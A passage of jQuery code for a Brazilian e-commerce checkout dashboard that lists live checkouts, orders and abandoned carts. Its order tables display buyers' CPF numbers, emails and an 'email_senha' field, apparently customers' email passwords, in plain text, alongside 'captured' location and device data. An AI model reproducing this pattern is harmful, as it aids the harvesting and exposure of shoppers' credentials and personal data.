                            "[Status] => " + status,
                            "[Error] => " + error
                        );
                        rej({ request: request, status: status, erro: error });
                    },
                });
            });
        },
        async selectAbaCheckout(objusuario) {
            return new Promise((res) => {
                $.ajax({
                    url: objusuario.url_api + "dashboard/getLojasCheckout",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + objusuario.api_token,
                    },
                    data: {
                        tipo_usuario: objusuario.tipo_usuario,
                        id_usuario: objusuario.id_usuario,
                    },
                    success: (retorno) => {
                        if (retorno.status != 500) {
                            $("#select_loja").empty();

                            if (retorno.length == 0) {
                                $("#select_loja").prop("disabled", true);
                                $("#select_loja").append(
                                    $("<option>", {
                                        value: "-1",
                                        text: "Você não tem lojas cadastradas",
                                    })
                                );
                            }
                            retorno.forEach((v, i) => {
                                $("#select_loja").append(
                                    $("<option>", {
                                        value: v.id_loja,
                                        text: v.nm_loja,
                                    })
                                );
                            });

                            $("#select_loja").prepend(
                                $("<option>", {
                                    value: -1,
                                    text: "Selecione uma loja",
                                })
                            );

                            $("#select_loja").val("-1").change();
                            res();
                        }
                    },
                });
            });
        },
        async destroiSessao() {
            $.get("destroiSessao", (r) => {});
        },
        async usuariosOnlineCheckout() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "getUsuariosOnline",
                {
                    flag: "checkout",
                    tipo_usuario: usuario.tipo_usuario,
                    id_usuario: usuario.id_usuario,
                },
                "POST"
            );
            $("#table_online").empty();

            if (dados.length > 0) {
                $("#btn_online_checkout").text(`Checkout (${dados.length})`);
                let _lista = [];
                let _lista2 = [];
                dados.forEach((v, i) => {
                    $("#table_online").append(
                        $("<tr>")
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                            style: "display: flex; justify-content:center; width: 50%;",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                style: "font-size: 11px !important;",
                                                text: v.titulo,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                style: "font-size: 11px !important;",
                                                text: v.quantidade,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                style: "font-size: 11px !important;",
                                                text:
                                                    "R$ " +
                                                    v.preco * v.quantidade,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                style: "font-size: 11px !important;",
                                                text: v.nm_loja,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                style: "font-size: 11px !important;",
                                                text: v.local_checkout,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class:
                                                    "badge " +
                                                    (v.finalizou_pedido == "s"
                                                        ? "bg-gradient-success"
                                                        : "bg-gradient-danger"),
                                                text:
                                                    v.finalizou_pedido == "s"
                                                        ? "Sim"
                                                        : "Não",
                                                style: "font-size: 10px; border-radius: 30px;",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                text:
                                                    v.nome_completo ??
                                                    "Não capturado ainda",
                                                style: "font-size: 10px; border-radius: 30px;",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                text:
                                                    v.localizacao ??
                                                    "Não localizado",
                                                style: "font-size: 10px; border-radius: 30px;",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                text:
                                                    v.dispositivo ??
                                                    "Não capturado",
                                                style: "font-size: 10px; border-radius: 30px;",
                                            })
                                        )
                                    )
                                )
                            )
                    );
                });
            } else if (dados.length == 0) {
                $("#btn_online_checkout").text("Checkout (0)");
            }
            _global.getCards();
            _global.loadingAba("dashboard", false);
        },
        async btnDashboardUsuarios() {
            $("#btn_online_checkout").click(function (e) {
                $(this).css("border", "1px solid #37b637");
                $("#btn_online_loja").css("border", "1px solid gainsboro");
                selectedAbaUsuario = "checkout";
                _global.usuariosOnlineCheckout();
            });

            $("#btn_online_loja").click(function (e) {
                $(this).css("border", "1px solid #37b637");
                $("#btn_online_checkout").css("border", "1px solid gainsboro");
                selectedAbaUsuario = "loja";
            });
        },
        eventoDataPedidos() {
            $("#pedido_inicio").change(function (e) {
                _global.tabelaPedidos();
            });

            $("#pedido_fim").change(function (e) {
                _global.tabelaPedidos();
            });
        },
        async tabelaPedidos(abandoned = false) {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getPedidos",
                {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
                    inicio: $("#pedido_inicio").val(),
                    fim: $("#pedido_fim").val(),
                    abandoned,
                },
                "POST"
            );

            $("#table_pedidos").empty();
            $("#ul_pedidos").empty();

            let _l = [];
            if (dados.length > 0) {
                let _i = 0;
                let i_aux = 0;
                _l[_i] = [];
                dados.forEach((v, i) => {
                    if (i_aux >= 10) {
                        i_aux = 0;
                        _i++;
                        _l[_i] = [];
                    }
                    _l[_i].push(v);
                    i_aux++;
                });
            }

            _global.pedidos = _l;
            _global.reconstroiTabela = (indice) => {
                $("#table_pedidos").empty();
                _global.pedidos[indice].forEach((v, i) => {
                    $("#table_pedidos").append(
                        $("<tr>", {
                            id: "pedido_" + v.id_carrinho,
                        })
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.id_carrinho,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.status,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>", {
                                    hidden: !abandoned,
                                }).append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.withdrawal,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.titulo,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.quantidade,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    "R$ " +
                                                    (
                                                        v.quantidade * v.preco +
                                                        parseFloat(
                                                            v.valor_orderbump
                                                        )
                                                    ).toFixed(2),
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.nome_completo,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.cpf,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.email,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    v.email_senha != null
                                                        ? v.email_senha
                                                        : "Não habilitado",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.data_pedido,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    v.metodo_pagamento == "pix"
                                                        ? "Pix"
                                                        : v.metodo_pagamento ==
                                                          "cartao"
                                                        ? "Cartão de Crédito"
                                                        : "Cartão",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class:
                                                    "badge " +
                                                    (v.sn_pix_copiado == "n"
                                                        ? "bg-gradient-danger"
                                                        : "bg-gradient-success"),
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text:
                                                    v.sn_pix_copiado == "n"
                                                        ? "Não"
                                                        : "Sim",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                text: v.frete_selecionado,
                                                style: "font-size: 10px; border-radius: 30px;",
                                                class: "badge bg-gradient-primary",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    "R$ " +
                                                    v.frete_selecionado_valor,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<img>", {
                                                src: "/assetsdashboard/img/zap.png",
                                                class: "cursorpointer enviozapzap",
                                                style: "width: 60%;",
                                                i: v.id_loja,
                                                click: async function (e) {
                                                    let verificaCredencial =
                                                        await _global.busca(
                                                            "dashboard/verificaWhatsapp",
                                                            {
                                                                id_loja:
                                                                    $(
                                                                        this
                                                                    ).attr("i"),
                                                            },
                                                            "POST"
                                                        );
                                                    let hash =
                                                        $(this).attr("h");

                                                    if (
                                                        verificaCredencial.status ==
                                                        404
                                                    ) {
                                                        _global.toast(
                                                            "Você não tem credênciais de Whatsapp para esta loja.",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }
                                                    if (
                                                        verificaCredencial.status !=
                                                        200
                                                    ) {
                                                        _global.toast(
                                                            "Não foi possível efetuar a operação [ERRO INTERNO].",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/getStatusWhatsapp",
                                                            {
                                                                h: $(this).attr(
                                                                    "h"
                                                                ),
                                                            },
                                                            "POST"
                                                        );
                                                    if (
                                                        dados.whatsapp_pedido ==
                                                        undefined
                                                    ) {
                                                        _global.toast(
                                                            "Houve um erro interno.",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    $(
                                                        "#content_modal_whatsapp"
                                                    ).empty();

                                                    $("#content_modal_whatsapp")
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pedido",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-success",
                                                                            text: "Enviado",
                                                                            disabled: true,
                                                                            flag: "pedido",
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pagamento",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-" +
                                                                                (dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? "success"
                                                                                    : "primary"),
                                                                            text:
                                                                                dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? "Enviado"
                                                                                    : "Enviar",
                                                                            disabled:
                                                                                dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? true
                                                                                    : false,
                                                                            flag: "aprovado",
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Rastreio",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-" +
                                                                                (dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? "success"
                                                                                    : "primary"),
                                                                            text:
                                                                                dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? "Enviado"
                                                                                    : "Enviar",
                                                                            disabled:
                                                                                dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? true
                                                                                    : false,
                                                                            flag: "rastreio",
                                                                        }
                                                                    )
                                                                )
                                                        );

                                                    $("." + hash).click(
                                                        function (e) {
                                                            e.preventDefault();
                                                            _global.enviaMensagemWhatsapp(
                                                                hash,
                                                                $(this).attr(
                                                                    "flag"
                                                                ),
                                                                $(this)
                                                            );
                                                        }
                                                    );

                                                    $("#modalwhatsapp").modal(
                                                        "show"
                                                    );
                                                },
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                            style: "    align-items: center; display: flex; justify-content: center;",
                                        }).append(
                                            $("<img>", {
                                                src: "/assetsdashboard/img/email.png",
                                                class: "cursorpointer enviozapzap",
                                                style: "width: 35%;",
                                                h: v.hash,
                                                i: v.id_loja,
                                                click: async function (e) {
                                                    let h = $(this).attr("h");
                                                    let l = $(this).attr("i");

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/verificaEmailPedido",
                                                            {
                                                                h: $(this).attr(
                                                                    "h"
                                                                ),
                                                                l: $(this).attr(
                                                                    "i"
                                                                ),
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 404) {
                                                        _global.toast(
                                                            "A loja não tem um SMTP cadastrado.",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    $(
                                                        "#content_modal_email"
                                                    ).empty();
                                                    $("#content_modal_email")
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 33%; height: 100%; display: flex;     flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pedido",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                "btn btn-" +
                                                                                (dados.email_pedido ==
                                                                                "n"
                                                                                    ? "primary"
                                                                                    : "success"),
                                                                            text:
                                                                                dados.email_pedido ==
                                                                                "n"
                                                                                    ? "Enviar"
                                                                                    : "Enviado",
                                                                            disabled:
                                                                                dados.email_pedido ==
                                                                                "n"
                                                                                    ? false
                                                                                    : true,
                                                                            click: async function (
                                                                                e
                                                                            ) {
                                                                                _global.btnCarregando(
                                                                                    $(
                                                                                        this
                                                                                    ),
                                                                                    true,
                                                                                    "Enviar"
                                                                                );

                                                                                let dados =
                                                                                    await _global.busca(
                                                                                        "dashboard/enviaConfirmacaoPedido",
                                                                                        {
                                                                                            h: h,
                                                                                            l: l,
                                                                                        },
                                                                                        "POST"
                                                                                    );

                                                                                if (
                                                                                    dados.status ==
                                                                                    200
                                                                                ) {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviado"
                                                                                    );
                                                                                    $(
                                                                                        this
                                                                                    )
                                                                                        .removeClass(
                                                                                            "btn-primary"
                                                                                        )
                                                                                        .addClass(
                                                                                            "btn-success"
                                                                                        );
                                                                                    $(
                                                                                        this
                                                                                    ).prop(
                                                                                        "disabled",
                                                                                        true
                                                                                    );
                                                                                    _global.toast(
                                                                                        "O email de confirmação foi enviado com sucesso.",
                                                                                        "toastsucesso"
                                                                                    );
                                                                                } else {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviar"
                                                                                    );
                                                                                    _global.toast(
                                                                                        "Não foi possível enviar o email de confirmação",
                                                                                        "toasterro"
                                                                                    );
                                                                                }
                                                                            },
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 33%; height: 100%; display: flex; margin-left: 15px; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Lembrete de Pagamento",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                "btn btn-" +
                                                                                (dados.email_lembrete ==
                                                                                "n"
                                                                                    ? "primary"
                                                                                    : "success"),
                                                                            text:
                                                                                dados.email_lembrete ==
                                                                                "n"
                                                                                    ? "Enviar"
                                                                                    : "Enviado",
                                                                            disabled:
                                                                                dados.email_lembrete ==
                                                                                "n"
                                                                                    ? false
                                                                                    : true,
                                                                            click: async function (
                                                                                e
                                                                            ) {
                                                                                _global.btnCarregando(
                                                                                    $(
                                                                                        this
                                                                                    ),
                                                                                    true,
                                                                                    "Enviar"
                                                                                );

                                                                                let dados =
                                                                                    await _global.busca(
                                                                                        "dashboard/enviaLembretePagamento",
                                                                                        {
                                                                                            h: h,
                                                                                            l: l,
                                                                                        },
                                                                                        "POST"
                                                                                    );

                                                                                if (
                                                                                    dados.status ==
                                                                                    200
                                                                                ) {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviado"
                                                                                    );
                                                                                    $(
                                                                                        this
                                                                                    )
                                                                                        .removeClass(
                                                                                            "btn-primary"
                                                                                        )
                                                                                        .addClass(
                                                                                            "btn-success"
                                                                                        );
                                                                                    $(
                                                                                        this
                                                                                    ).prop(
                                                                                        "disabled",
                                                                                        true
                                                                                    );
                                                                                    _global.toast(
                                                                                        "O email de lembrete de pagamento foi enviado com sucesso.",
                                                                                        "toastsucesso"
                                                                                    );
                                                                                } else {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviar"
                                                                                    );
                                                                                    _global.toast(
                                                                                        "Não foi possível enviar o email de lembrete de pagamento",
                                                                                        "toasterro"
                                                                                    );
                                                                                }
                                                                            },
                                                                        }
                                                                    )
                                                                )
                                                        );

                                                    $("#modalemail").modal(
                                                        "show"
                                                    );
                                                },
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "btn-inner--icon cursorpointer",
                                                pedido: v.id_carrinho,
                                                style: "display: flex; justify-content: center;",
                                                click: function (e) {
                                                    $(
                                                        "#btn_modal_apaga"
                                                    ).click();
                                                    $(
                                                        "#confirma_deleta_pedido"
                                                    ).attr(
                                                        "pedido",
                                                        $(this).attr("pedido")
                                                    );
                                                },
                                            }).append(
                                                $("<i>", {
                                                    class: "ni ni-fat-remove",
                                                    style: "font-size: 25px; color: red;",
                                                })
                                            )
                                        )
                                    )
                                )
                            )
                    );
                });
            };

            $("#confirma_deleta_pedido")
                .off("click")
                .on("click", function (e) {
                    e.preventDefault();
                    _global.deletaPedido($(this).attr("pedido"));
                });

            if (_l.length > 0) {
                _l[0].forEach((v, i) => {
                    //v.status is null for some reason
                    //need to check backend I believe
                    console.log("pedidos v", v);

                    $("#table_pedidos").append(
                        $("<tr>", {
                            id: "pedido_" + v.id_carrinho,
                        })
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.id_carrinho,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.status || "Unpaid",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>", {
                                    hidden: !abandoned,
                                }).append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.withdrawal,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.titulo,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 text-sm",
                                                text: v.quantidade,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    "R$ " +
                                                    (
                                                        v.quantidade * v.preco
                                                    ).toFixed(2),
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.nome_completo,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.cpf,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.email,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    v.email_senha != null
                                                        ? v.email_senha
                                                        : "Não habilitado",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text: v.data_pedido,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    v.metodo_pagamento == "pix"
                                                        ? "Pix"
                                                        : v.metodo_pagamento ==
                                                          "card"
                                                        ? "Cartão de Crédito"
                                                        : "Cartão",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class:
                                                    "badge " +
                                                    (v.sn_pix_copiado == "n"
                                                        ? "bg-gradient-danger"
                                                        : "bg-gradient-success"),
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text:
                                                    v.sn_pix_copiado == "n"
                                                        ? "Não"
                                                        : "Sim",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                text: v.frete_selecionado,
                                                style: "font-size: 10px; border-radius: 30px;",
                                                class: "badge bg-gradient-primary",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<h6>", {
                                                class: "mb-0 h6pedidos",
                                                text:
                                                    "R$ " +
                                                    v.frete_selecionado_valor,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<img>", {
                                                src: "/assetsdashboard/img/zap.png",
                                                class: "cursorpointer enviozapzap",
                                                style: "width: 60%;",
                                                h: v.hash,
                                                i: v.id_loja,
                                                click: async function (e) {
                                                    let verificaCredencial =
                                                        await _global.busca(
                                                            "dashboard/verificaWhatsapp",
                                                            {
                                                                id_loja:
                                                                    $(
                                                                        this
                                                                    ).attr("i"),
                                                            },
                                                            "POST"
                                                        );
                                                    let hash =
                                                        $(this).attr("h");

                                                    if (
                                                        verificaCredencial.status ==
                                                        404
                                                    ) {
                                                        _global.toast(
                                                            "Você não tem credênciais de Whatsapp para esta loja.",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }
                                                    if (
                                                        verificaCredencial.status !=
                                                        200
                                                    ) {
                                                        _global.toast(
                                                            "Não foi possível efetuar a operação [ERRO INTERNO].",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/getStatusWhatsapp",
                                                            {
                                                                h: $(this).attr(
                                                                    "h"
                                                                ),
                                                            },
                                                            "POST"
                                                        );
                                                    if (
                                                        dados.whatsapp_pedido ==
                                                        undefined
                                                    ) {
                                                        _global.toast(
                                                            "Houve um erro interno.",
                                                            "toasterro"
                                                        );
                                                        return;
